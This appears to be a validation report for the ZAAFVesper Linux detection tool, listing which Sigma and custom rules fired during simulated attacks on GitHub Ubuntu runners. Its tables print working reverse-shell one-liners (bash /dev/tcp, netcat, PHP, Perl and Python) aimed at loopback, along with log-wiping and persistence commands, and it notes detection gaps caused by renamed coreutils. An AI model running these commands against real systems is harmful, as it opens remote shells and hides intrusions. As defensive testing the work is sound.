# Live validation: Linux

**In plain words:** on fresh Linux machines run by GitHub, Sysmon for Linux and ZAAFVesper were installed exactly as our
install notes say. ZAAFVesper then watched a set of harmless attack simulations. **On Ubuntu 24.04 all 16 Linux rules raised
their alert. On Ubuntu 26.04, 13 of 16 did.** The 3 that did not are SigmaHQ rules that look for programs named `rm` and `cp`,
and Ubuntu 26.04 renamed those (see "What the live runs found"). ZAAFVesper's own rule for the same behaviour still fired.

> **Validated on GitHub runners, not on your server.** The runners are throw-away `ubuntu-24.04` and `ubuntu-latest`
> (Ubuntu 26.04) machines. Your distribution, kernel and Sysmon configuration will differ.

**Words used here.**
- **Sysmon**: Microsoft's free system monitor. It records process starts, network connections, file and registry changes; ZAAFVesper reads its events.
- **SigmaHQ**: the public collection of Sigma detection rules; 11 of our Linux rules are converted from it.
- **Atomic Red Team**: a public library of small, documented attack simulations, one per ATT&CK technique.
- **Rule fired**: ZAAFVesper raised that rule's alert while the test that should trigger it was running.

**Run:** <https://github.com/rifqifitriady/ZAAFVesper/actions/runs/42602354087> (commit `f1f86c5`, workflow `.github/workflows/live-windows-linux.yml`).

## Setup on the runners

| Part | Version and pin |
|---|---|
| Sysmon for Linux | `sysmonforlinux` 1.6.0 and `sysinternalsebpf` 2.3.0 from `packages.microsoft.com`, with one SHA-256 pair each for Ubuntu 24.04 and 26.04. It logs to journald as `sysmon.service`; its journald rate limit is lifted with `packaging/linux/sysmon-log-ratelimit.conf`. |
| Sysmon configuration | `scripts/ci/b/sysmon-linux.xml`: every process create and exit, network connect, file create and delete |
| ZAAFVesper | built from this commit, installed under `/usr/local/{sbin,etc}` and started with `packaging/linux/zaafvesper.service` (hardened unit) |
| Tests | Atomic Red Team at commit `a0e3f9bc…` (hash-checked YAML), run as root by `scripts/ci/b/artrun` from `scripts/ci/b/linux-plan.json` |

How tests are counted:
- The same way as for Windows (see [windows.md](windows.md)): per test window, with a canary test at the start and the end.
- "inline" tests are local equivalents of the converted Sigma rules, most of which have no Atomic test.
- Everything acts on the runner itself or on loopback (`127.0.0.1`, `::1`).

## Results: Ubuntu 24.04 LTS

16 rules for linux: **16 fired**, **0 fired for some tests only**, **0 did not fire**, **0 not tested**.

| Rule | Result | Tests | Detail |
|---|---|---|---|
| Copy Passwd Or Shadow From TMP Path<br>`rules/sigma/linux/proc_creation_lnx_cp_passwd_or_shadow_tmp.yml` | fired | inline-cp-passwd-tmp: fired (alert 10:40:12.157, test 10:40:12.155–10:40:12.158) | /usr/bin/cp (pid 5724, parent /home/runner/work/ZAAFVesper/ZAAFVesper/build/artrun) ran: cp /etc/passwd /tmp/zaafvesper-passwd (Sigma rule by Joseliyo Sanchez, @Joseliyo_Jstnk) |
| Cron job file created<br>`rules/linux/persistence_cron_file_write.yml` | fired | art-T1053.003-078e69eb: fired (alert 10:39:44.682, test 10:39:44.679–10:39:44.681), art-T1053.003-2d943c18: fired (alert 10:39:46.688, test 10:39:46.685–10:39:46.687) | /usr/bin/dash (pid 5337, user ) created cron file /etc/cron.d/persistevil |
| History File Deletion<br>`rules/sigma/linux/proc_creation_lnx_susp_history_delete.yml` | fired | art-T1070.003-a934276e: fired (alert 10:39:51.774, test 10:39:51.771–10:39:51.773) | /usr/bin/rm (pid 5604, parent /usr/bin/dash) ran: rm /root/.bash_history (Sigma rule by Florian Roth (Nextron Systems)) |
| Interactive shell redirected to a network socket<br>`rules/linux/execution_reverse_shell_dev_tcp.yml` | fired | inline-bash-dev-tcp: fired (alert 10:39:55.784, test 10:39:55.782–10:39:59.788) | /usr/bin/bash (pid 5610, parent /home/runner/work/ZAAFVesper/ZAAFVesper/build/artrun, user root) reverse shell: /bin/bash -c (timeout 6 nc -6 -l ::1 4444 >/dev/null 2>&1 &); sleep 1; timeout 3 bash -c 'bash -i >& /dev/tc… |
| Linux HackTool Execution<br>`rules/sigma/linux/proc_creation_lnx_susp_hktl_execution.yml` | fired | canary-start: fired (alert 10:39:42.671, test 10:39:42.669–10:39:42.675), inline-hacktool-name: fired (alert 10:40:14.164, test 10:40:14.162–10:40:14.168), canary-end: fired (alert 10:40:25.644, test 10:40:25.642–1… | /tmp/zaafvesper/canary/nuclei (pid 5333, parent /home/runner/work/ZAAFVesper/ZAAFVesper/build/artrun) ran: /tmp/zaafvesper/canary/nuclei -c true (Sigma rule by Nasreddine Bencherchali (Nextron Systems), Georg Lauenstein … |
| Linux Reverse Shell Indicator<br>`rules/sigma/linux/net_connection_lnx_back_connect_shell_dev.yml` | fired | inline-bash-dev-tcp: fired (alert 10:39:56.791, test 10:39:55.782–10:39:59.788) | /usr/bin/bash (pid 5617) outbound connection 0:0:0:0:0:0:0:1:54776 -> 0:0:0:0:0:0:0:1:4444 (Sigma rule by Florian Roth (Nextron Systems)) |
| Linux Webshell Indicators<br>`rules/sigma/linux/proc_creation_lnx_webshell_detection.yml` | fired | inline-webshell-parent: fired (alert 10:40:23.637, test 10:40:22.627–10:40:23.637) | /usr/bin/whoami (pid 5766, parent /tmp/zaafvesper/nginx) ran: /usr/bin/whoami (Sigma rule by Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)) |
| Potential Netcat Reverse Shell Execution<br>`rules/sigma/linux/proc_creation_lnx_netcat_reverse_shell.yml` | fired | inline-netcat-e: fired (alert 10:40:01.796, test 10:40:01.792–10:40:01.796) | /usr/bin/nc.openbsd (pid 5710, parent /usr/bin/timeout) ran: nc -e /bin/sh 127.0.0.1 4444 (Sigma rule by @d4ns4n_, Nasreddine Bencherchali (Nextron Systems)) |
| Potential PHP Reverse Shell<br>`rules/sigma/linux/proc_creation_lnx_php_reverse_shell.yml` | fired | inline-php-fsockopen: fired (alert 10:40:08.070, test 10:40:08.066–10:40:08.111) | /usr/bin/php8.3 (pid 5720, parent /usr/bin/timeout) ran: php -r $sock=fsockopen("127.0.0.1",4447);exec("/bin/sh -i <&3 >&3 2>&3"); (Sigma rule by @d4ns4n_) |
| Potential Perl Reverse Shell Execution<br>`rules/sigma/linux/proc_creation_lnx_perl_reverse_shell.yml` | fired | inline-perl-socket: fired (alert 10:40:03.802, test 10:40:03.797–10:40:03.812) | /usr/bin/perl (pid 5713, parent /usr/bin/timeout) ran: perl -e use Socket;$i="127.0.0.1";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STD… |
| Python Reverse Shell Execution Via PTY And Socket Modules<br>`rules/sigma/linux/proc_creation_lnx_python_reverse_shell.yml` | fired | inline-python-pty: fired (alert 10:40:05.945, test 10:40:05.941–10:40:06.064) | /usr/bin/python3.12 (pid 5716, parent /usr/bin/timeout) ran: python3 -c import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",4446));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh") (Sigma rule by @d… |
| Shell history file deleted<br>`rules/linux/stealth_shell_history_deleted.yml` | fired | art-T1070.003-a934276e: fired (alert 10:39:51.774, test 10:39:51.771–10:39:51.773) | /usr/bin/rm (pid 5604, user ) deleted /root/.bash_history |
| Sudoers file created outside visudo<br>`rules/linux/privilege_escalation_sudoers_file_write.yml` | fired | inline-sudoers-dropin: fired (alert 10:39:53.779, test 10:39:53.774–10:39:53.778) | /usr/bin/tee (pid 5608, user ) wrote /etc/sudoers.d/zaafvesper-validation |
| Suspicious Java Children Processes<br>`rules/sigma/linux/proc_creation_lnx_susp_java_children.yml` | fired | inline-java-child: fired (alert 10:40:17.568, test 10:40:16.172–10:40:20.623) | /usr/bin/dash (pid 5756, parent /usr/lib/jvm/temurin-17-jdk-amd64/bin/java) ran: /bin/sh -c id (Sigma rule by Nasreddine Bencherchali (Nextron Systems)) |
| Syslog Clearing or Removal Via System Utilities<br>`rules/sigma/linux/proc_creation_lnx_clear_syslog.yml` | fired | inline-syslog-rm: fired (alert 10:40:10.143, test 10:40:10.141–10:40:10.143) | /usr/bin/rm (pid 5723, parent /home/runner/work/ZAAFVesper/ZAAFVesper/build/artrun) ran: rm -f /var/log/syslog.zaafvesper-validation (Sigma rule by Max Altgelt (Nextron Systems), Roberto Rodriguez (Cyb3rWard0g), OTR (Ope… |
| Systemd unit file created outside the package manager<br>`rules/linux/persistence_systemd_unit_file_write.yml` | fired | art-T1543.002-d9e4f24f: fired (alert 10:39:48.695, test 10:39:48.692–10:39:49.235) | /usr/bin/bash (pid 5343, user ) created systemd unit /etc/systemd/system/art-systemd-service.service |

##### Tests run

| Test | Kind | Exit | Note |
|---|---|---|---|
| canary-start  | inline | 0 | Canary: a bash copy named nuclei. It proves the sensor receives and evaluates events at this point of the run, independent of which coreutils the image ships. |
| art-T1053.003-078e69eb Cron - Add script to /etc/cron.d folder | atomic | 0 |  |
| art-T1053.003-2d943c18 Cron - Add script to /var/spool/cron/crontabs/ folder | atomic | 0 |  |
| art-T1543.002-d9e4f24f Create Systemd Service | atomic | 0 |  |
| art-T1070.003-a934276e Clear Bash history (rm) | atomic | 0 | The setup step creates the history file first so the delete happens. |
| inline-sudoers-dropin  | inline | 0 | A comment-only drop-in, removed right after. |
| inline-bash-dev-tcp  | inline | 0 | Loopback only (::1). The Sigma rule excludes 127.0.0.1 and 0.0.0.0 but not ::1, so an IPv6 loopback connection still exercises it; nothing leaves the machine. |
| inline-netcat-e  | inline | 0 | The runner's nc (OpenBSD) refuses -e; the command line is what the rule checks. |
| inline-perl-socket  | inline | 0 | Closed local port: the connection fails. |
| inline-python-pty  | inline | 0 | Closed local port: the connection fails. |
| inline-php-fsockopen  | inline | 0 | Closed local port. Needs php on the runner image. |
| inline-syslog-rm  | inline | 0 | Removes a file that does not exist; the command line is what the rule checks. |
| inline-cp-passwd-tmp  | inline | 0 |  |
| inline-hacktool-name  | inline | 0 | /bin/true copied under a scanner's name. |
| inline-java-child  | inline | 0 | Needs a JDK on the runner image (single-file source launch). The JVM stays up 3 s after its child, as a server would: Sysmon for Linux reports the forking thread as the parent, and the sensor maps it to the JVM through /… |
| inline-webshell-parent  | inline | 0 | bash copied under the name nginx starts whoami a second after it starts, as a running web server with a webshell would. (Without the pause, Sysmon for Linux can report the child before the parent's exec, so the parent st… |
| canary-end  | inline | 0 | Canary: a bash copy named nuclei. It proves the sensor receives and evaluates events at this point of the run, independent of which coreutils the image ships. |

## Results: Ubuntu 26.04 LTS (ubuntu-latest)

16 rules for linux: **13 fired**, **0 fired for some tests only**, **3 did not fire**, **0 not tested**.

| Rule | Result | Tests | Detail |
|---|---|---|---|
| Cron job file created<br>`rules/linux/persistence_cron_file_write.yml` | fired | art-T1053.003-078e69eb: fired (alert 10:39:32.919, test 10:39:32.909–10:39:32.911), art-T1053.003-2d943c18: fired (alert 10:39:34.925, test 10:39:34.915–10:39:34.918) | /usr/bin/dash (pid 5271, user ) created cron file /etc/cron.d/persistevil |
| Interactive shell redirected to a network socket<br>`rules/linux/execution_reverse_shell_dev_tcp.yml` | fired | inline-bash-dev-tcp: fired (alert 10:39:44.995, test 10:39:44.986–10:39:48.999) | /usr/bin/bash (pid 5577, parent /home/runner/work/ZAAFVesper/ZAAFVesper/build/artrun, user root) reverse shell: /bin/bash -c (timeout 6 nc -6 -l ::1 4444 >/dev/null 2>&1 &); sleep 1; timeout 3 bash -c 'bash -i >& /dev/tc… |
| Linux HackTool Execution<br>`rules/sigma/linux/proc_creation_lnx_susp_hktl_execution.yml` | fired | canary-start: fired (alert 10:39:30.903, test 10:39:30.895–10:39:30.905), inline-hacktool-name: fired (alert 10:40:03.275, test 10:40:03.267–10:40:03.277), canary-end: fired (alert 10:40:14.142, test 10:40:14.133–1… | /tmp/zaafvesper/canary/nuclei (pid 5265, parent <none>) ran: /tmp/zaafvesper/canary/nuclei -c true (Sigma rule by Nasreddine Bencherchali (Nextron Systems), Georg Lauenstein (sure[secure])) |
| Linux Reverse Shell Indicator<br>`rules/sigma/linux/net_connection_lnx_back_connect_shell_dev.yml` | fired | inline-bash-dev-tcp: fired (alert 10:39:46.007, test 10:39:44.986–10:39:48.999) | /usr/bin/bash (pid 5584) outbound connection 0:0:0:0:0:0:0:1:46754 -> 0:0:0:0:0:0:0:1:4444 (Sigma rule by Florian Roth (Nextron Systems)) |
| Linux Webshell Indicators<br>`rules/sigma/linux/proc_creation_lnx_webshell_detection.yml` | fired | inline-webshell-parent: fired (alert 10:40:12.132, test 10:40:11.110–10:40:12.128) | /usr/lib/cargo/bin/coreutils/whoami (pid 5736, parent /tmp/zaafvesper/nginx) ran: /usr/bin/whoami (Sigma rule by Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)) |
| Potential Netcat Reverse Shell Execution<br>`rules/sigma/linux/proc_creation_lnx_netcat_reverse_shell.yml` | fired | inline-netcat-e: fired (alert 10:39:51.014, test 10:39:51.000–10:39:51.008) | /usr/bin/nc.openbsd (pid 5680, parent /usr/lib/cargo/bin/coreutils/timeout) ran: nc -e /bin/sh 127.0.0.1 4444 (Sigma rule by @d4ns4n_, Nasreddine Bencherchali (Nextron Systems)) |
| Potential PHP Reverse Shell<br>`rules/sigma/linux/proc_creation_lnx_php_reverse_shell.yml` | fired | inline-php-fsockopen: fired (alert 10:39:57.193, test 10:39:57.179–10:39:57.252) | /usr/bin/php8.5 (pid 5691, parent /usr/lib/cargo/bin/coreutils/timeout) ran: php -r $sock=fsockopen("127.0.0.1",4447);exec("/bin/sh -i <&3 >&3 2>&3"); (Sigma rule by @d4ns4n_) |
| Potential Perl Reverse Shell Execution<br>`rules/sigma/linux/proc_creation_lnx_perl_reverse_shell.yml` | fired | inline-perl-socket: fired (alert 10:39:53.022, test 10:39:53.009–10:39:53.032) | /usr/bin/perl (pid 5683, parent /usr/lib/cargo/bin/coreutils/timeout) ran: perl -e use Socket;$i="127.0.0.1";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(S… |
| Python Reverse Shell Execution Via PTY And Socket Modules<br>`rules/sigma/linux/proc_creation_lnx_python_reverse_shell.yml` | fired | inline-python-pty: fired (alert 10:39:55.047, test 10:39:55.034–10:39:55.178) | /usr/bin/python3.14 (pid 5686, parent /usr/lib/cargo/bin/coreutils/timeout) ran: python3 -c import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",4446));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh… |
| Shell history file deleted<br>`rules/linux/stealth_shell_history_deleted.yml` | fired | art-T1070.003-a934276e: fired (alert 10:39:40.983, test 10:39:40.973–10:39:40.975) | /usr/bin/gnurm (pid 5572, user ) deleted /root/.bash_history |
| Sudoers file created outside visudo<br>`rules/linux/privilege_escalation_sudoers_file_write.yml` | fired | inline-sudoers-dropin: fired (alert 10:39:42.990, test 10:39:42.977–10:39:42.983) | /usr/lib/cargo/bin/coreutils/tee (pid 5575, user ) wrote /etc/sudoers.d/zaafvesper-validation |
| Suspicious Java Children Processes<br>`rules/sigma/linux/proc_creation_lnx_susp_java_children.yml` | fired | inline-java-child: fired (alert 10:40:06.079, test 10:40:05.281–10:40:09.105) | /usr/bin/dash (pid 5728, parent /usr/lib/jvm/temurin-25-jdk-amd64/bin/java) ran: /bin/sh -c id (Sigma rule by Nasreddine Bencherchali (Nextron Systems)) |
| Systemd unit file created outside the package manager<br>`rules/linux/persistence_systemd_unit_file_write.yml` | fired | art-T1543.002-d9e4f24f: fired (alert 10:39:36.933, test 10:39:36.923–10:39:37.953) | /usr/bin/bash (pid 5276, user ) created systemd unit /etc/systemd/system/art-systemd-service.service |
| Copy Passwd Or Shadow From TMP Path<br>`rules/sigma/linux/proc_creation_lnx_cp_passwd_or_shadow_tmp.yml` | did not fire | inline-cp-passwd-tmp: did not fire (test 10:40:01.259–10:40:01.263) | Known reason: on Ubuntu 26.04 cp runs as /usr/bin/gnucp; the SigmaHQ rule matches only images ending in /cp. |
| History File Deletion<br>`rules/sigma/linux/proc_creation_lnx_susp_history_delete.yml` | did not fire | art-T1070.003-a934276e: did not fire (test 10:39:40.973–10:39:40.975) | Known reason: on Ubuntu 26.04 rm runs as /usr/bin/gnurm; the SigmaHQ rule matches only images ending in /rm, /unlink or /shred. The hand-written rule 'Shell history file deleted' (file event) still fires. |
| Syslog Clearing or Removal Via System Utilities<br>`rules/sigma/linux/proc_creation_lnx_clear_syslog.yml` | did not fire | inline-syslog-rm: did not fire (test 10:39:59.254–10:39:59.258) | Known reason: on Ubuntu 26.04 rm runs as /usr/bin/gnurm (the Rust coreutils switch keeps GNU rm under that name); the SigmaHQ rule matches only images ending in /rm. |

##### Tests run

| Test | Kind | Exit | Note |
|---|---|---|---|
| canary-start  | inline | 0 | Canary: a bash copy named nuclei. It proves the sensor receives and evaluates events at this point of the run, independent of which coreutils the image ships. |
| art-T1053.003-078e69eb Cron - Add script to /etc/cron.d folder | atomic | 0 |  |
| art-T1053.003-2d943c18 Cron - Add script to /var/spool/cron/crontabs/ folder | atomic | 0 |  |
| art-T1543.002-d9e4f24f Create Systemd Service | atomic | 0 |  |
| art-T1070.003-a934276e Clear Bash history (rm) | atomic | 0 | The setup step creates the history file first so the delete happens. |
| inline-sudoers-dropin  | inline | 0 | A comment-only drop-in, removed right after. |
| inline-bash-dev-tcp  | inline | 0 | Loopback only (::1). The Sigma rule excludes 127.0.0.1 and 0.0.0.0 but not ::1, so an IPv6 loopback connection still exercises it; nothing leaves the machine. |
| inline-netcat-e  | inline | 0 | The runner's nc (OpenBSD) refuses -e; the command line is what the rule checks. |
| inline-perl-socket  | inline | 0 | Closed local port: the connection fails. |
| inline-python-pty  | inline | 0 | Closed local port: the connection fails. |
| inline-php-fsockopen  | inline | 0 | Closed local port. Needs php on the runner image. |
| inline-syslog-rm  | inline | 0 | Removes a file that does not exist; the command line is what the rule checks. |
| inline-cp-passwd-tmp  | inline | 0 |  |
| inline-hacktool-name  | inline | 0 | /bin/true copied under a scanner's name. |
| inline-java-child  | inline | 0 | Needs a JDK on the runner image (single-file source launch). The JVM stays up 3 s after its child, as a server would: Sysmon for Linux reports the forking thread as the parent, and the sensor maps it to the JVM through /… |
| inline-webshell-parent  | inline | 0 | bash copied under the name nginx starts whoami a second after it starts, as a running web server with a webshell would. (Without the pause, Sysmon for Linux can report the child before the parent's exec, so the parent st… |
| canary-end  | inline | 0 | Canary: a bash copy named nuclei. It proves the sensor receives and evaluates events at this point of the run, independent of which coreutils the image ships. |

## What the live runs found and fixed

1. **The systemd unit could not start on Ubuntu** (seen in [run 1](https://github.com/rifqifitriady/ZAAFVesper/actions/runs/42574233249)). `/var/log` is `root:syslog 0775` on
   Debian and Ubuntu, and ZAAFVesper refuses, rightly, an output folder whose parent another account can change. The unit now
   writes to `/var/lib/zaafvesper/logs` (systemd `StateDirectory`, root-only). There is an upgrade note in `packaging/linux/README.md`,
   and `TestLinuxUnitOutputDir` checks the unit.
2. **Parents of multi-threaded processes were lost** (seen in runs [2](https://github.com/rifqifitriady/ZAAFVesper/actions/runs/42574949960) and [3](https://github.com/rifqifitriady/ZAAFVesper/actions/runs/42575738469)).
   - Sysmon for Linux reports the *thread* that forked as `ParentProcessId`. When that thread is not a process, it leaves
     `ParentImage` empty and the parent GUID zero.
   - With a JVM or a Go program as parent, `ps.parent.*` was therefore nil, and "Suspicious Java Children Processes" did not fire.
   - Fix: the journald source maps the thread id to its process through `/proc/<tid>/status` (`Tgid`), while the thread exists
     and only if that process started before the event. It keeps the original id in `evt.arg[parent_thread_id]`.
   - Tests: `TestFixThreadParent`, and `TestTgidOfOwnThreads` on real Linux. `TestLiveThreadParentFixture` replays the exact
     event captured in [run 7](https://github.com/rifqifitriady/ZAAFVesper/actions/runs/42601419858).
   - A parent that exits right after starting its child still loses it, so the Java test keeps its JVM up for 3 s, as a server would.
3. **Ubuntu 26.04 renames core tools** (seen in runs [7](https://github.com/rifqifitriady/ZAAFVesper/actions/runs/42601419858) and [8](https://github.com/rifqifitriady/ZAAFVesper/actions/runs/42602354087)).
   - With the switch to Rust coreutils, `rm` and `cp` run as `/usr/bin/gnurm` and `/usr/bin/gnucp`, and `whoami` as
     `/usr/lib/cargo/bin/coreutils/whoami`.
   - The three SigmaHQ rules that match images ending in `/rm` or `/cp` cannot fire there (the rows above). ZAAFVesper's
     own file-based rule "Shell history file deleted" still fires.
   - The converted rules must stay identical to SigmaHQ, so changing them is a separate decision (a documented local
     deviation, or a fix proposed upstream).
4. **Sysmon for Linux can report a child before its parent's exec.** When a process forks within microseconds of its own
   exec, the child's event can arrive first, with the parent still under its old image. The webshell test therefore lets its
   fake web server run for a second before it starts `whoami`, as a real server would.
5. **Kill identity.** Events reach ZAAFVesper through journald after a short delay, so most short-lived commands have exited
   before their identity can be bound (`identity_read_errors` in the service journal). The kill response refuses those by
   design; long-lived processes are bound. Kills themselves are validated by workstream D.
6. **Smaller observations.** Sysmon for Linux writes `-` for the user of many file events, so `ps.username` is empty there. It
   appends ` (deleted)` to the image path of a process whose executable was removed.

## Re-run

Actions → `live-windows-linux` → *Run workflow*, or push to a `validate/**` branch. The `validation-linux-<image>` artifacts hold
the alerts, the service journal, the raw Sysmon events and per-test results.
